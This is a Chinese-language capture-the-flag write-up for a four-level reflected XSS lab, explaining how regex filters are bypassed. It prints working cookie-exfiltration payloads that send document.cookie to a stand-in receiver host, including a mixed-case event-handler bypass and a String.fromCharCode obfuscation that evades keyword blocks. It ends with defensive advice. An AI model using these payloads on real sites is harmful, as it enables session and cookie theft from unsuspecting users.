# XSS LAB

## 题目简述

题目包含四关反射型 XSS。每一关的机器人都会在访问 payload 前设置一个 Cookie：前三关的 Cookie 值是下一关路径，第四关的 Cookie 才是 flag。需要逐步理解正则过滤器的缺口，把 Cookie 发送到自己控制的 HTTP 接收端。

## 解题过程

### 整体流程

每关页面会把 `payload` 通过 `{{ payload|safe }}` 原样放入 HTML。向当前路径提交表单后，Selenium 机器人设置对应 Cookie，再访问：

```text
当前路径?payload=<URL 编码后的 payload>
```

因此每一关都要让机器人的浏览器向接收端发送 `document.cookie`。收到的前三个值依次揭示：

```text
xss2=/0d566d04bbc014c2d1d0902ad50a4122
xss3=/5d1aaeadf1b52b4f2ab7042f3319a267
xss4=/b355082fc794c4d1d2b6c02e04163090
```

以下示例使用 `domain` 表示攻击者可查看请求的 HTTP 接收端。

### 第一关：无过滤

第一关不处理输入，直接使用脚本重定向：

```html
<script>document.location.replace("http://domain/?c="+document.cookie)</script>
```

接收端取得 `xss2` Cookie 后，访问其值所指向的第二关。

### 第二关：不用 `script` 和闭合标签

第二关过滤：

```python
regex = ".*(script|(</.*>)).*"
```

使用不需要闭合标签的错误事件：

```html
<img src=x onerror='document.location.replace("http://domain/?c="+document.cookie)'>
```

图片加载失败后触发 `onerror`，接收端得到第三关路径。

### 第三关：大小写事件与协议相对 URL

第三关额外拦截 `://` 和形如 `on...=` 的小写事件属性：

```python
regex = ".*(://|script|(</.*>)|(on\\w+\\s*=)).*"
```

正则没有开启忽略大小写，因此把属性写成 `oNerror`；同时用 `//domain/` 代替带协议的 URL：

```html
<img src=x oNerror='document.location.replace("//domain/?c="+document.cookie)'>
```

浏览器仍把 HTML 属性名视为不区分大小写，JavaScript 可以正常执行，由此得到第四关路径。

### 第四关：动态构造被禁字符串

第四关不区分大小写地拦截 `/`、`script`、`document`、`cookie`、`eval`、`string`，还拦截 `+` 和多种引号组合。事件属性检查仍位于忽略大小写分组之外，所以继续使用 `oNerror`。

关键是通过 `String.fromCharCode()` 动态生成被禁内容：

- 第一组字符码生成 `http://domain/?c=`，源码中不出现字面量 `/`；
- 第二组生成 `document`，再用 `window[...]` 取对象；
- 第三组生成 `cookie`，再用计算属性读取 Cookie；
- 用 `.concat()` 代替被禁的 `+`。

最终 payload 为：

```html
<img src=x oNerror="location.replace(''.__proto__.constructor.fromCharCode(104,116,116,112,58,47,47,100,111,109,97,105,110,47,63,99,61).concat(window[``.__proto__.constructor.fromCharCode(100,111,99,117,109,101,110,116)][location.host.__proto__.constructor.fromCharCode(99,111,111,107,105,101)]))">
```

其中第一组数字对应字符串 `http://domain/?c=`。若接收域名不是 `domain`，可以用下面的单行代码重新生成该组十进制字符码：

```python
print(",".join(str(value) for value in b"http://your-host.example/?c="))
```

机器人访问第四关 payload 后，接收端收到：

```text
flag=N0PS{n0w_Y0u_4r3_x55_Pr0}
```

## 方法总结

四关的推进关系本身也是题目机制：前三次 XSS 先泄露隐藏路由，最后一次才泄露 flag。各关绕过分别依赖无闭合标签的事件处理器、正则大小写差异、协议相对 URL，以及运行时字符串构造。防御时不应尝试用正则枚举危险字符串；应按输出上下文进行转义，避免 `|safe` 输出不可信数据，并使用成熟的 HTML 清洗器和 CSP 作为纵深措施。
